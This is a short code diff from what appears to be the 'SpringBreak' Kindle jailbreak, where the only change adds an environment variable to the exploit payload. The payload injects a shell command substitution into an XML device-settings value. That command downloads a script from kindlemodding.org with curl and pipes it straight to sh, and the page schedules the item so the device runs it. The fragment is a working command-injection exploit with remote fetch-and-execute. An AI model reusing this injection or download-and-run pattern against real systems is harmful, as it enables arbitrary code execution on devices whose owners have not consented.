@@ -117,7 +117,7 @@
 
         //Logic
         var info = "SpringBreak Jailbreak\\nBy Penguins184, H^9\\nThanks To Scam.net, Hackerdude\\nhttps://ko-fi.com/penguins186";
-        var payload = '<?xml version="1.0" encoding="UTF-8"?><response><total_count>1</total_count><items><item priority="1" type="SCFG" action="SET" key="DUMMY" is_incremental="false" sequence="0">winmgr.vibrancyMode.pref.path=$(curl -L kindlemodding.org/jb.sh | JB_HEADER="' + info + '" sh; set-dynconf-value winmgr.vibrancyMode.pref.path "") #</item></items></response>';
+        var payload = '<?xml version="1.0" encoding="UTF-8"?><response><total_count>1</total_count><items><item priority="1" type="SCFG" action="SET" key="DUMMY" is_incremental="false" sequence="0">winmgr.vibrancyMode.pref.path=$(curl -L kindlemodding.org/jb.sh | RUN_MODE=1 JB_HEADER="' + info + '" sh; set-dynconf-value winmgr.vibrancyMode.pref.path "") #</item></items></response>';
         window.kindle.todo.scheduleItems(payload); //Set Payload (Next Step Causes Trigger)
         
         setTimeout(function () {
